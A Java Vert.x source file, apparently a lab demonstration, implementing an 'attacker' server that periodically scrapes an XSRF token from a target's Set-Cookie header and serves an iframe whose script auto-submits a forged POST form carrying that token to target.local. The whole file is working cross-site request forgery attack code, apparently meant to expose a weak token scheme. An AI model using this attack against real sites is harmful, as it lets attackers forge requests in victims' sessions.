package io.vertx.example.xsrf;


import io.vertx.rxjava.core.AbstractVerticle;
import io.vertx.rxjava.core.buffer.Buffer;
import io.vertx.rxjava.ext.web.Router;
import io.vertx.rxjava.ext.web.RoutingContext;
import io.vertx.rxjava.ext.web.client.HttpResponse;
import io.vertx.rxjava.ext.web.client.WebClient;

import java.util.logging.Logger;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AttackerVerticle extends AbstractVerticle {
    private static final Logger log = Logger.getLogger(XSRFVerticle.class.getName());
    private static String xsrf_token = "";

    private static final String INDEX_HTML = "<html>\n" +
            "<body>\n" +
            "<iframe src=\"/iframe\"></iframe>\n" +
            "</body>\n" +
            "</html>\n";

    private static final String IFRAME_HTML = "<html>\n" +
            "<head>\n" +
            "</head>\n" +
            "<body>\n" +
            "<script>\n" +
            "var xsrftoken = \"$$XSRF\";\n" +
            "\n" +
            "var f = document.createElement(\"form\");\n" +
            "f.setAttribute('method', \"post\");\n" +
            "f.setAttribute('action', \"http://target.local:8888/token\");\n" +
            "\n" +
            "var i = document.createElement(\"input\"); \n" +
            "i.setAttribute('type', \"text\");\n" +
            "i.setAttribute('name', \"X-XSRF-TOKEN\");\n" +
            "i.setAttribute('value',xsrftoken);\n" +
            "\n" +
            "var s = document.createElement(\"input\"); \n" +
            "s.setAttribute('type', \"submit\");\n" +
            "s.setAttribute('value', \"Submit\");\n" +
            "\n" +
            "f.appendChild(i);\n" +
            "f.appendChild(s);\n" +
            "\n" +
            "document.getElementsByTagName('body')[0].appendChild(f);\n" +
            "\n" +
            "f.submit();\n" +
            "\n" +
            "\n" +
            "</script>\n" +
            "</body>\n" +
            "</html>";
    @Override
    public void start() {
        Router router = Router.router(vertx);
        router.get().handler(this::handleGet);
        vertx.createHttpServer().requestHandler(router::accept).listen(7777);
        vertx.setPeriodic(5000, id -> {
            getToken();
        });
    }

    private void handleGet(RoutingContext routingContext){
        log.warning(routingContext.normalisedPath() );
        if (routingContext.normalisedPath().equals("/iframe")) routingContext.response().end(IFRAME_HTML.replace("$$XSRF",xsrf_token));
        else routingContext.response().end(INDEX_HTML);
    }

    private void getToken(){
        WebClient client = WebClient.create(vertx);
        // Send a GET request
        client
        .get(8888, "target.local", "/token")
        .send(ar -> {
            if (ar.succeeded()) {
                // Obtain response
                HttpResponse<Buffer> response = ar.result();

                for (String header : response.headers().getAll("Set-Cookie")){
                    if (header.startsWith("XSRF-TOKEN=")){
                        Pattern PATTERN_JSESSIONID = Pattern.compile("^.*XSRF-TOKEN=(.*);");
                        Matcher m = PATTERN_JSESSIONID.matcher(header);
                        if (m.find()) {
                            xsrf_token = m.group(1);
                            log.warning(xsrf_token);
                        }
                    }
                }
            } else {

            }
        });
    }

}